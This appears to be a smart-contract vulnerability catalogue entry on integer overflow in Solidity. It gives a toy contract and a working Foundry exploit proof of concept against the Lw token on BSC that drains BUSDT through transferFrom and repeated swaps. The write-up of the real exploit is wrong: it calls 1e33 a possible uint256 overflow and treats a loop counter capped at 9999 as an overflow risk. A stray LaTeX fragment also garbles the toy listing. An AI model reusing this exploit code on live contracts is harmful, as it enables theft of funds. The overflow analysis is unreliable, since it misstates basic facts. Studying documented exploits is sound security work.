## Description
This vulnerability was first identified during the attack on BEC tokens [1]. It occurs when the result of a calculation exceeds the maximum or minimum limit of the variable's data type, making it impossible to accurately represent the value. This issue is particularly prevalent in smaller data types. For instance, when a balance reaches the upper limit of  2^256 ,  it resets to zero. Furthermore, division operations on integers in Solidity can introduce rounding errors, which may result in unexpected discrepancies in calculations that require high precision [2]. While these issues may not directly constitute an integer overflow or underflow vulnerability, they can lead to logical flaws in the business logic of smart contracts.
## Toy Example
```Solidity
Overflow,Underflow in Solidity} ,label={lst:overflow}]
contract IntegerOverflowExample {
    mapping(address => uint256) public balances;
    uint256 public constant MAX_UINT = type(uint256).max;
    function deposit(uint256 amount) public {
        require(amount > 0, "Amount must be greater than zero");
        balances[msg.sender] += amount; // Possible overflow if not checked
    }
    function withdraw(uint256 amount) public {
        require(amount > 0, "Amount must be greater than zero");
        require(balances[msg.sender] >= amount, "Insufficient balance");
        balances[msg.sender] -= amount; // Underflow risk if unchecked
    }
    function forceOverflow() public {
        balances[msg.sender] = MAX_UINT; // Assign max value
        balances[msg.sender] += 1; // This would have caused overflow in older Solidity versions (<0.8.0)
    }
}
```


## Real-World Example
Date Identified: 08/07/2024

Lost: ~7K USD

Highlighted Line: Lw.transferFrom(address(Lw), address(this), 1_000_000_000_000_000_000_000_000_000_000_000);
 
•	Potential Integer Overflow:
o	The value 1_000_000_000_000_000_000_000_000_000_000_000 is extremely large and could exceed the storage capacity of uint256, especially if the Lw contract does not implement overflow protection.
o	If the Lw contract is written in an older version of Solidity (prior to 0.8.0) or does not use a library like SafeMath, it may allow an overflow to occur, causing the value to "wrap around" to a smaller number, effectively bypassing intended limits.

Highlighted Line: while (i < 9999) {
    swap_token_to_token(address(Lw), address(BUSDT), 800_000_000 ether);
    i++;
}
 
•	Risk of Integer Overflow on i:
o	The variable i is incremented in a loop up to 9999 iterations. If there is an overflow in i (e.g., if i exceeds uint256 storage capacity), the loop may behave unexpectedly, causing unintended or infinite execution.
•	Potential Overflow in Token Amount:
o	The value 800_000_000 ether is passed to the swap_token_to_token function. If this value is further processed in the Lw or BUSDT contracts without overflow protection, it could result in unintended behavior or manipulation of balances.

Below is the smart contract used in the exploitation of the identified vulnerabilities [3].
```Solidity 
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo -- Total Lost : ~7K USD
// TX : https://app.blocksec.com/explorer/tx/bsc/0x96a955304fed48a8fbfb1396ec7658e7dc42b7c140298b80ce4206df34f40e8d
// Attacker : https://bscscan.com/address/0x56b2d55457b31fb4b78ebddd6718ea2667804a06
// Attack Contract : https://bscscan.com/address/0xfe7e9c76affdba7b7442adaca9c7c059ec3092fc
// GUY : https://x.com/0xNickLFranklin/status/1810245893490368820

contract Exploit is Test {
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IERC20 Lw = IERC20(0xABC6e5a63689b8542dbDC4b4f39a7e00d4AC30c8);
    IERC20 BUSDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    address Hackcontract;

    function setUp() external {
        cheats.createSelectFork("bsc", 40_287_544);
        deal(address(BUSDT), address(this), 0);
    }

    function testExploit() external {
        emit log_named_decimal_uint("[Begin] Attacker BUSDT before exploit", BUSDT.balanceOf(address(this)), 18);
        Money Hackcontract = new Money();
        emit log_named_decimal_uint("[End] Attacker BUSDT after exploit", BUSDT.balanceOf(address(this)), 18);
    }
}

contract Money is Test {
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IPancakePair Pair = IPancakePair(0x88fF4f62A75733C0f5afe58672121568a680DE84);
    IERC20 Lw = IERC20(0xABC6e5a63689b8542dbDC4b4f39a7e00d4AC30c8);
    IERC20 BUSDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IPancakeRouter router = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
    address owner;

    constructor() {
        owner = msg.sender;
        Attack();
    }

    function Attack() public {
        Lw.transferFrom(address(Lw), address(this), 1_000_000_000_000_000_000_000_000_000_000_000);
        uint256 i = 0;
        while (i < 9999) {
            swap_token_to_token(address(Lw), address(BUSDT), 800_000_000 ether);
            i++;
        }
        BUSDT.transfer(msg.sender, BUSDT.balanceOf(address(this)));
    }

    function swap_token_to_token(address a, address b, uint256 amount) internal {
        IERC20(a).approve(address(router), type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = address(a);
        path[1] = address(b);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(amount, 0, path, address(this), block.timestamp);
    }
}
``` 
## References 
[1] Huashan Chen, Marcus Pendleton, Laurent Njilla, and Shouhuai Xu. A survey on ethereum systems security: Vulnerabilities, attacks, and defenses.
ACM Computing Surveys (CSUR), 53(3):1–43, 2020.

[2] Christof Ferreira Torres, Julian Schütte, and Radu State. Osiris: Hunting for integer bugs in ethereum smart contracts. In Proceedings of the 34th
annual computer security applications conference, pages 664–676, 2018.

[3] https://github.com/SunWeb3Sec/DeFiHackLabs
